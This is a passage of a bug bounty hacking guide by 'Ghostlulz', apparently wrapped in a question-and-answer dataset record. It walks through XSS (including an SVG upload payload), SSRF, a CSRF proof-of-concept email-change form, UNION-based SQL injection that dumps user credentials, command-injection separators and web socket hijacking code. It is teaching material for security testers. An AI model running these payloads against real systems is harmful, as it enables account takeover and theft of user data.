protect against XSS we could insert malicious\nJavaScript code into the user browser.\nGhostlulz AKA Alex Thomas\nPage | 181\nFigure 108: XSS payload triggering\nAs you can tell in the above image the JavaScript code in the “error” GET\nparameter is being embedded in the applications source code. Since our input is\nbeing reflected back without XSS protections we can easily execute malicious\nJavaScript code in users’ browsers if they visit this link.\nStored XSS\nUnlike reflected XSS stored XSS persistence in the application. Usually this\noccurs when an application takes user supplied input and stores it in the backend\ndatabase.\nI don’t normally see this happening with GET requests as those types of requests\naren’t typically used when modifying the backend database. POST, PUT,\nUPDATE, and DELETE requests and normally used when making changes to a\nGhostlulz AKA Alex Thomas\nPage | 182\ndatabase. Because of this I typically see stored XSS when dealing with those\ntypes of requests.\nFigure 109: XSS description\nSuppose you have an application that allows you to create an account. The\napplication also has a page which lists out all the members of the site. You could\nassume that the username you create is being stored in the backend database\notherwise how would the application be able to retrieve this information. If you\nwere to put a malicious JavaScript payload as your username it would then be\nstored in the back-end database. If the application isn’t blocking XSS attacks\nwhenever someone visits the members list page your username would be\nretrieved from the back-end database and your XSS payload would trigger.\nGhostlulz AKA Alex Thomas\nPage | 183\n\nDOM XSS\nDocument Object Model (DOM) based XSS occurs when an application takes\nuser supplied input passes it to a JavaScript function and that function uses the\ninput to modify the DOM environment. This can occur via reflected or stored XSS\nthe main thing to remember is that the payload is being executed via JavaScript.\n<html>\n<h1> You Searched for:</h1>\n<div id =\"searchquery\"> </div>\n<script>\nvar keyword = location.search.substring(3);\ndocument.querySelector('searchquery').innerHTML = keyword;\n<script>\n</html>\nThe above source code is an example of DOM based XSS.\nStored XSS via SVG file\nScalable Vector Graphics(SVG) is an XML-based vector image format for two-\ndimensional graphics with support for interactivity and animation. The below code\nis an example of a basic SVG file that will show a picture of a rectangle:\n<svg width=\"400\" height=\"110\">\n<rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\n</svg>\nSVG files also support inline JavaScript code. For instance, a developer might\nuse JavaScript in an SVG image so they can manipulate it in real time. This can\nbe used for animation and other tasks. Another thing to note is that SVG files can\nbe treated as images in HTML. This means you can place an SVG file in an\nimage tag and it will render perfectly:\nGhostlulz AKA Alex Thomas\nPage | 184\n<img src=\"rectangle.svg\" alt=\"Rectangle\" height=\"42\" width=\"42\">\nIf a website loads an SVG file with an XSS payload it will get executed. This is\noften over looked by developers and attackers alike. An example SVG file with\nan alert XSS payload can be found below:\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n<rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\n<script type=\"text/javascript\">\nalert(\"Ghostlulz XSS\");\n</script>\n</svg>\nOne easy way to test for this vulnerability is to upload an SVG file as your profile\npicture as shown in the below burp requests:\nPOST /profile/upload HTTP/1.1\nHost: XXXXXXXXX.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: /\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nAuthorization: Bearer XXXXXXXXXXXXXXXXXX\nContent-Type: multipart/form-data; boundary=---------------------------232181429808\nContent-Length: 574\nConnection: close\nReferer: https://XXXXXXXXX\n-----------------------------232181429808\nContent-Disposition: form-data; name=\"img\"; filename=\"img.svg\"\nContent-Type: image/svg+xml\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n<rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\n<script type=\"text/javascript\">\nalert(\"Ghostlulz XSS\");\n</script>\n</svg>\n-----------------------------232181429808--\nGhostlulz AKA Alex Thomas\nPage | 185\nNotice the content type is set to:\nContent-Type: image/svg+xml\nOnce the image is uploaded you just need to find out what path it was uploaded\nto. This can easily be done by right clicking the image and selecting “copy image\naddress” , if your using google chrome.\nFigure 110: XSS payload triggering\nIf everything worked when you view the image your payload will execute. You\njust got stored XSS via an SVG file.\nGhostlulz AKA Alex Thomas\nPage | 186\nServer Side Request Forgery (SSRF)\nIntroduction\nServer-Side Request Forgery (SSRF) occurs when an attacker forces an\napplication to make HTTP requests on their behalf. This can be used to read\ndata from internal applications. Most people leverage this vulnerability to post or\nread data from sensitive endpoints such as AWS and Gcloud metadata service,\nFTP service, LDAP service, and local files.\n\nSSRF\nWhen looking for SSRF vulnerabilities I typically search for requests that have a\nURL as a parameter value. If the response is reflected back to the attacker you\ncould have a possible SSRF vulnerability. I will then change the URL to\ngoogle.com and if I see a response then I can assume the endpoint is vulnerable.\nThe next step is to find a vulnerable endpoint on the systems local host or on an\nendpoint in the local network.\nGhostlulz AKA Alex Thomas\nPage | 187\nFigure 111: SSRF payload\nIn the above requests I changed the “stockApi” value to an admin directory on\nthe systems local IP. The request will be performed by the target application thus\nit will perform a request against itself. This endpoint has an admin application\nhosted on the local host, normally this would be impossible to access from the\ninternet but because of SSRF we can.\nGhostlulz AKA Alex Thomas\nPage | 188\nFigure 112: Admin panel hosted on targets local host\nIf we render the html response, we can see that we are able to access an internal\nadmin application hosted on the target system.\nThe hardest part about SSRF is proving the impact of the vulnerability. You have\nto find an application to exploit that would be impossible without using SSRF. If\nyou can’t find an endpoint on the local host you can also send requests to\nservers on the targets internal network. If you find yourself on an application\nhosted on Google Cloud or other cloud providers you can try to read the\nmetadata service to retrieve API keys and credentials.\nConclusion\nSSRF is a relatively simple vulnerability to exploit. The majority of hackers\nleverage this vulnerability to access applications hosted on the targets local\nsystem or internal network. The hardest part of this vulnerability isn’t finding the\nexploit it’s finding an endpoint to retrieve sensitive data from. Don’t forget you\nGhostlulz AKA Alex Thomas\nPage | 189\ncan also use SSRF to move laterally by exploiting internal hosts as some exploits\nonly require a GET or POST request.\nCross Site Request Forgery (CSRF)\nIntroduction\nCross site request forgery (CSRF) is an attack performed on an applications user\nthat causes their browser to send requests on behalf of the attacker. This can be\nused to change a user’s password and email, like a page or video, send money\nto an attacker, and anything else you can do via a POST request.\n\nCSRF\nIn order to exploit CSRF the target user has to be logged in to the target web\napplication while visiting malicious site in the same browser. Using JavaScript, it\nis possible to send requests to sites on behalf of users via their cookies. Cookies\nare sometimes used for authentication so if we can send requests using a user’s\ncookie, we can impersonate them. So, if a user visits an attacker controlled site,\nwe can use JavaScript to send a POST request using the victims cookies.\nGhostlulz AKA Alex Thomas\nPage | 190\nFigure 113: CSRF workflow\nThis would allow the attacker to send authenticated request via the victims\nbrowser.\nSuppose an application allows users to change their email by submitting a form.\nIf the application fails to protect against CSRF attacks attackers could force users\nto change their email to an attacker controlled email. After that the attacker could\nperform a password reset to change the users password and take over their\naccount.\nGhostlulz AKA Alex Thomas\nPage | 191\nFigure 114: Request vulnerable to CSRF\nAs you can see in the above request there is no CSRF token, no authentication\nheader, and the application fails to check the refer header. We should be able to\nperform a CSRF attack but to make sure you should create a proof of concept\n(POC) page.\n<html>\n<form id=\"exploit\" action=\"https://acc71f681f28327e80e13486006a005a.web-security-\nacademy.net/email/change-email\" method=\"post\">\n<input name=\"email\" value=\"attack@test.com\">\n<input type='submit' value='submit'>\n</form>\n<script>\ndocument.getElementById(\"exploit\").submit()\n</script>\n</html>\nThe above code can be used as a POC to proof that CSRF is possible. It’s also a\ngood idea to make sure something is actually exploitable before submitting a\nreport.\nGhostlulz AKA Alex Thomas\nPage | 192\nConclusion\nCSRF is a really old vulnerability yet I still seem to run into it all the time. If you\nare testing an application that has user accounts you should always check for\nCSRF. If the application fails to protect against this you could leverage it to\nchange users’ emails, passwords, and anything else you wanted.\nSQL Injection (SQLI)\nIntroduction\nSQL Injection (SQL) is a classic vulnerability that doesn’t seem to be going\nanywhere. This vulnerability can be exploited to dump the contents of an\napplications database. Databases typically hold sensitive information such as\nusernames and passwords so gaining access to this is basically game over. The\nmost popular database is MySQL but you will run into others such as MSSQL,\nPostgreSQL, Oracle, and more. The way you exploit each of these is similar but\ndifferent. A nice cheat sheet can be found on payloadallthethings:\n• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%2\n0Injection\n\nSQLI\nI seem to run into MySQL more than any other database but that doesn’t mean\nyou won’t see others. A typically MySQL can be found below:\nGhostlulz AKA Alex Thomas\nPage | 193\nFigure 115: MySQL error indicating SQL injection\nIf you ever see that error you know there is SQL injection. However, I’ll be\ndemonstrating how to exploit a PostgreSQL server today. The error message I\ngot was a little less noticeable and could easily go undetected.\nFigure 116: PostgreSQL SQL error\nIf you suspect there is SQL injection you would then proceed to finding the\nnumber of columns being returned to the application. This can be done with the\n“order by\" command.\nGhostlulz AKA Alex Thomas\nPage | 194\nFigure 117: SQL order by to get tables column count\nBasically, you ask the database “do you have 1 column?”, the server will then\nrespond and says yes. You then ask “do you have 2 columns?” and the server\nresponds again with yes. Then you ask “do you have 3 columns?” and the\ndatabase errors out. So, you know the database table only contains 2 columns.\n‘ order by <Number here>--\nGhostlulz AKA Alex Thomas\nPage | 195\nFigure 118: Order by to get column count\nAs you can see the server responds back without any errors. This is basically\ntelling us the server has 2 columns. The below request shows what happens\nwhen the server errors out indicating that number of columns doesn’t exists.\nFigure 119: Order by error\nKnowing that there are only 2 columns we need to figure out which columns are\nused to display text on the application. We need to know this so we know which\ncolumn to use when extracting data.\n‘ union select NULL,NULL—\nGhostlulz AKA Alex Thomas\nPage | 196\nThe union select command can be utilized to retrieve data from the backend\ndatabase. Some database will error out if the column data type is incorrect. For\nthis reason, we use the word “NULL” which in most cases will default to\nwhatever data type the database is expecting. We discovered that there are only\ntwo columns so that’s why you only see two NULL columns being selected.\nWe need to find out which column is being used to display text on the screen. To\ndo this we can replace each selected column with a string and see if it appears\non the page.\n' union select NULL,'VULNERABLE'--\nFigure 120: Union select to find text column\nGhostlulz AKA Alex Thomas\nPage | 197\nAs you can see our text was outputted to the screen. This means that the second\nparameter is the one we want to use when extracting data from the back end\ndatabase.\nThe first thing we need to retrieve are the table names in the current database.\nThe “information_schema” database is a default database which contains\ninformation on the table names, column names, and everything else in the\ndatabase. In this database there is a table called “table” and this table contains a\ncolumn named “table_name”. We can utilize this information to list every table in\nthe database.\n' union select NULL, table_name from information_schema.tables—\nFigure 121: List of tables in the database\nAs you can see there is a table named “users”. The next step is to determine this\ntables column names. Again, we can use the “information_schema” database for\nthis.\nGhostlulz AKA Alex Thomas\nPage | 198\n' union select NULL, column_name from information_schema.columns\nwhere table_name = '<Table Name Here>'—\nFigure 122: List of columns in the users table\nAs you can see there are two columns names password and username. The final\nstep is to exfiltrate the data. To return the password and username in the same\ncolumn I will have to use the “concat()” function.\n' union select NULL, concat(<Column Name>,':',<Column Name 2>) from\n<Table Name>--\nGhostlulz AKA Alex Thomas\nPage | 199\nFigure 123: Dumping username and password of users\nIt’s worth learning how to exploit SQL injection by hand. The vast majority of\npeople use tools that they don’t fully understand thus limiting their capabilities.\nHowever, in the real world if you find a vulnerable endpoint it’s probably best to\nuse a tool like SQLmap as its easier and faster.\n• https://github.com/sqlmapproject/sqlmap\nConclusion\nSQL injection has been on the OWASP top 10 since the beginning and it doesn’t\nseem to be coming off any time soon. There are many different types of\ndatabases and exploiting each one is slightly different. If you’re doing this in the\nGhostlulz AKA Alex Thomas\nPage | 200\nreal world is probably better to use a tool like SQLmap but you should know how\nto do this by hand as your tools might not always work.\nCommand Injection\nIntroduction\nCommand injection was really popular back in the day but you won’t find it that\noften in today’s application. However, every now and again I find some really bad\napplication that is vulnerable to this. Attackers can leverage this vulnerable to\ngain remote code execution (RCE) on their target.\nCommand Injection\nSometimes applications will take user supplied input and pass as an argument to\na tool on the command line. Passing user supplied input to the command line is\nalways a bad idea and should be avoided. Depending on the operating system\nyou can use several techniques to execute additional commands thus allowing\nan attacker to gain RCE.\nCommand Example OS Description\n& echo “hi” & echo “bye” Windows & Linux Runs the first\ncommand then\nthe second\ncommand\n&& echo “hi” && echo “bye” Windows & Linux Runs the\nsecond\ncommand only\nif the first\ncommand was\nsuccessful\nGhostlulz AKA Alex Thomas\nPage | 201\n| echo “hi” | echo “bye” Windows & Linux Pipe the first\ncommands\noutput into the\nsecond\ncommand\n|| echo “hi” || echo “bye” Windows & Linux Runs the\nsecond\ncommand only\nif the first\ncommand fails.\n; echo “hi”; echo “bye” Linux Run the first\ncommand then\nthe second\ncommand.\n`Command` echo “hi ` echo “bye”`” Linux Run second\ncommand\ninside first\ncommand.\nNote those are\nback tics NOT\nsingle quotes\n$(Command) echo “hi $(echo”bye”)” Linux Run second\ncommand\ninside first\ncommand.\nTable 5: Command injection techniques\nAn example of each of these commands being ran can be found below. Note\nthese were ran on a Linux machine.\nGhostlulz AKA Alex Thomas\nPage | 202\nFigure 124: Command injection examples\nIf you suspect an application is vulnerable to command injection you can easily\ntest for this vulnerable using the above techniques. An example can be found\nbellow:\nGhostlulz AKA Alex Thomas\nPage | 203\nFigure 125: Command injection request and response\nAs you can see, I injected the “echo hi” command and I received a response.\nThis is a very strong indicator that the application is vulnerable to command\ninjection. However, the vast majority of these bug are blind and you won’t see\nany output making it harder to detect.\nWith blind command injection you can’t use the “echo” command to test for this\nvulnerability as there is no output being displayed. You can attempt to ping,\nperform DNS lookup, or make an HTTP request against your machine though.\nThen you listen on your machine for a request from the target. If you get a\nrequest then you know they are vulnerable to blind command injection. Note to\nGhostlulz AKA Alex Thomas\nPage | 204\ntest for this you will need a public IP address so you can receive a call back from\nthe target server.\nConclusion\nCommand injection is an older vulnerability that I don’t find all that often any\nmore. If you do find this vulnerability it will most likely be blind command\ninjection. The impact of this vulnerability is critical as you can execute remote\ncommands on the server easily allowing you to do whatever you want.\nCross Site Web Socket Hijacking (CSWSH)\nIntroduction\nIt’s pretty rare for me to come across an application using web sockets but when\nI do I almost always find cross site web socket hijacking (CSWSH). Web sockets\nset up a full duplex communication channel allows use to both read and post\ndata. This vulnerability can be used to perform XSS, SQL injection, RCE, and\nanything else.\nWeb Sockets\nWebSocket is a computer communications protocol, providing full-duplex\ncommunication channels over a single TCP connection. Full duplex means we\ncan both read and write to the connection. Applications that utilize web sockets\nGhostlulz AKA Alex Thomas\nPage | 205\ntypically want a live two-way communication mechanism. For instance, a chat\napplication might use web sockets to send messages back and forth.\nFigure 126: Web socket connection\nAs shown above the connection starts off with the web socket handshake AKA\nan HTTP upgrade request. This is used to established the web socket\nconnection. An example web socket handshake is shown below:\nGhostlulz AKA Alex Thomas\nPage | 206\nFigure 127: Web socket handshake\nAfter the handshake is established you can start sending and receiving\nmessaging from the application"
  },
  {
    "input": "What is cross-site web socket hijacking (CSWSH) and how is it similar to CSRF?",
    "summary": "Cross site web socket hijacking (CSWSH) is similar to CSRF in that it uses the target's cookies to make unauthorized requests, but instead of a POST request, it initiates a WebSocket connection. Once connected, an attacker can send messages on behalf of the user, potentially leading to remote code execution. CSWSH is a less known vulnerability that can be exploited by having a user visit a malicious site while logged into the target application.",
    "output": "CSWSH\nCross site web socket hijacking (CSWSH) is similar to CSRF because we utilize\nthe targets cookies to make requests. Also, like CSRF the target would have to\nvisit our malicious page while logged into the target site for this to work. The\nmajor difference is instead of sending a POST request we initiate a web socket\nconnection. After the WebSocket connection is established we can do whatever\nwe want.\nSuppose we have a web application with a live chat feature that uses web\nsockets for communication.\nGhostlulz AKA Alex Thomas\nPage | 207\nFigure 128: Live chat using web sockets\nThe first thing you want to do is examine the traffic in burp. Most people only\nknow how to use burp to test HTTP traffic but it can also handle web socket\ntraffic as shown below:\nGhostlulz AKA Alex Thomas\nPage | 208\nFigure 129: Burp web socket traffic\nThe next step is to create a POC to see if we can hijack a user’s WebSocket\nconnection. We can use the following website to test for the vulnerability:\n● http://websocket.org/echo.html\nTo test for CSWSH you need to log into the target application as if you are a legit\nuser. Next you open a second tab in the same browser and attempt to create a\nweb socket connection. In this example I will be connecting to the live chat\napplication. If the endpoint is vulnerable, we will be able to create a web socket\nconnection using the user’s cookies.\nGhostlulz AKA Alex Thomas\nPage | 209\nFigure 130: CSWSH POC website\nAs you can see in the above image, I was able to initiate a web socket\nconnection using the users cookies. This is what makes it so similar to CSRF. A\nreal would attack would require a user to visit a malicious site while logged in to\nthe vulnerable application. The malicious site could then use the users cookies to\nestablish a web socket connection and send messages on behalf of the user.\nThe site also contains some POC code if you need to make any modification. It is\nalways a good idea to submit POC code when submitting a bounty.\n<!DOCTYPE html>\n<meta charset=\"utf-8\" />\n<title>WebSocket Test</title>\n<script language=\"JavaScript\" type=\"text/JavaScript\">\nvar wsUri = \"wss://echo.websocket.org/\";\nvar output;\nfunction init()\n{\nGhostlulz AKA Alex Thomas\nPage | 210\noutput = document.getElementById(\"output\");\ntestWebSocket();\n}\nfunction testWebSocket()\n{\nwebsocket = new WebSocket(wsUri);\nwebsocket.onopen = function(evt) { onOpen(evt) };\nwebsocket.onclose = function(evt) { onClose(evt) };\nwebsocket.onmessage = function(evt) { onMessage(evt) };\nwebsocket.onerror = function(evt) { onError(evt) };\n}\nfunction onOpen(evt)\n{\nwriteToScreen(\"CONNECTED\");\ndoSend(\"WebSocket rocks\");\n}\nfunction onClose(evt)\n{\nwriteToScreen(\"DISCONNECTED\");\n}\nfunction onMessage(evt)\n{\nwriteToScreen('<span style=\"color: blue;\">RESPONSE: ' + evt.data+'</span>');\nwebsocket.close();\n}\nfunction onError(evt)\n{\nwriteToScreen('<span style=\"color: red;\">ERROR:</span> ' + evt.data);\n}\nfunction doSend(message)\n{\nwriteToScreen(\"SENT: \" + message);\nwebsocket.send(message);\n}\nfunction writeToScreen(message)\n{\nvar pre = document.createElement(\"p\");\npre.style.wordWrap = \"break-word\";\npre.innerHTML = message;\noutput.appendChild(pre);\n}\nwindow.addEventListener(\"load\", init, false);\n</script>\n<h2>WebSocket Test</h2>\n<div id=\"output\"></div>\nFigure 131: CSWSH POC code\nGhostlulz AKA Alex Thomas\nPage | 211\nI have personally used this vulnerability to exploit quite a few applications. One of\nthe instances allowed me to completely take over users machines as the web\nsocket connection was being used to send shell commands to a remote server.\nThis allowed me to gain remote code execution (RCE).\nConclusion\nYou won’t run into applications using web sockets all that much but when you do\nthis is a great vulnerability to test for. Most developers and bug bounty hunters\ndon’t even know what this vulnerability. Like CSRF this is an attack on the end\nusers and can be used to establish a web socket connection while masquerading\nas the victim.\nSummary\nThis section only covered a small number of OWASP type vulnerabilities, there\nare many more. The most popular vulnerability found is probably XSS. Almost\nevery application seems to contain XSS and the payout for the vulnerability can\nbe anywhere from $50 to $1000 depending on the impact and the company.\nAnother common vulnerability is SQL injection. This has been around forever and\nwill probably stay on the OWASP top 10 forever. CSRF is another vulnerability I\nseem to find all the time. Most of the time I find this in the change email\nfunctionality of a website which allows me to change a user’s email. From there\nyou could issue a password reset to gain account take over. SSRF seems to be\na lesser known vulnerability but I still find this fairly often as well. There are so\nmany vulnerabilities that I would really need to write a second book.\nGhostlulz AKA Alex Thomas\nPage | 212\nGhostlulz AKA Alex Thomas"
  }
]